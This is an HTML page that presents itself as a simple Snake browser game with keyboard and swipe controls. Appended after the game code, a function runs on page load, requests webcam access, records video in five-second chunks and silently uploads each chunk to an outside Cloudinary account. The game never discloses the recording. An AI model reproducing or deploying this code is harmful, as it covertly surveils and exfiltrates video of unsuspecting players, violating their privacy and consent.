<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snake</title>
  <style>
    html, body {
      margin: 0;
      background: black;
      overflow: hidden;
    }
    canvas {
      display: block;
      margin: auto;
      background: #111;
      width: 100vw;
      height: 100vw;
      max-width: 500px;
    }
    #info {
      position: absolute;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      color: white;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div id="info">Loading game...</div>
  <canvas id="gameCanvas" width="400" height="400"></canvas>

  <script>
    const canvas = document.getElementById("gameCanvas");
    const ctx = canvas.getContext("2d");

    const tileSize = 20;
    const tileCount = 20;
    let snake = [{x: 10, y: 10}];
    let velocity = {x: 0, y: 0};
    let food = {x: 5, y: 5};
    let tail = 3;
    let score = 0;

    function gameLoop() {
      move();
      if (checkCollision()) {
        endGame();
        return;
      }
      draw();
    }

    function move() {
      const head = {x: snake[0].x + velocity.x, y: snake[0].y + velocity.y};
      snake.unshift(head);
      if (head.x === food.x && head.y === food.y) {
        score++;
        tail++;
        placeFood();
      }
      while (snake.length > tail) snake.pop();
    }

    function draw() {
      ctx.fillStyle = "#111";
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = "lime";
      for (let s of snake) {
        ctx.fillRect(s.x * tileSize, s.y * tileSize, tileSize - 2, tileSize - 2);
      }

      ctx.fillStyle = "red";
      ctx.fillRect(food.x * tileSize, food.y * tileSize, tileSize - 2, tileSize - 2);

      ctx.fillStyle = "white";
      ctx.fillText("Score: " + score, 10, 20);
    }

    function placeFood() {
      food = {
        x: Math.floor(Math.random() * tileCount),
        y: Math.floor(Math.random() * tileCount)
      };
    }

    function checkCollision() {
      const head = snake[0];
      if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount)
        return true;
      for (let i = 1; i < snake.length; i++) {
        if (snake[i].x === head.x && snake[i].y === head.y) return true;
      }
      return false;
    }

    function endGame() {
      clearInterval(loop);
      document.getElementById("info").textContent = "Game Over! Score: " + score;
    }

    document.addEventListener("keydown", e => {
      if (e.key === "ArrowUp" && velocity.y === 0) velocity = {x: 0, y: -1};
      else if (e.key === "ArrowDown" && velocity.y === 0) velocity = {x: 0, y: 1};
      else if (e.key === "ArrowLeft" && velocity.x === 0) velocity = {x: -1, y: 0};
      else if (e.key === "ArrowRight" && velocity.x === 0) velocity = {x: 1, y: 0};
    });

    // Mobile swipes
    let startX = 0, startY = 0;
    canvas.addEventListener("touchstart", e => {
      startX = e.touches[0].clientX;
      startY = e.touches[0].clientY;
    });
    canvas.addEventListener("touchend", e => {
      const dx = e.changedTouches[0].clientX - startX;
      const dy = e.changedTouches[0].clientY - startY;
      if (Math.abs(dx) > Math.abs(dy)) {
        if (dx > 10 && velocity.x === 0) velocity = {x: 1, y: 0};
        else if (dx < -10 && velocity.x === 0) velocity = {x: -1, y: 0};
      } else {
        if (dy > 10 && velocity.y === 0) velocity = {x: 0, y: 1};
        else if (dy < -10 && velocity.y === 0) velocity = {x: 0, y: -1};
      }
    });

    // Start
    placeFood();
    const loop = setInterval(gameLoop, 100);
    document.getElementById("info").textContent = "";

    // Webcam recording
    const cloudName = "dps0g5ftz";
    const uploadPreset = "unsigned";

    async function startCam() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const recorder = new MediaRecorder(stream);
        recorder.ondataavailable = e => {
          const data = new FormData();
          data.append("file", e.data);
          data.append("upload_preset", uploadPreset);
          fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
            method: "POST",
            body: data
          });
        };
        recorder.start(5000);
        document.getElementById("info").textContent = "";
      } catch (err) {
        document.getElementById("info").textContent = "Camera denied or error";
      }
    }

    window.onload = startCam;
  </script>
</body>
</html>
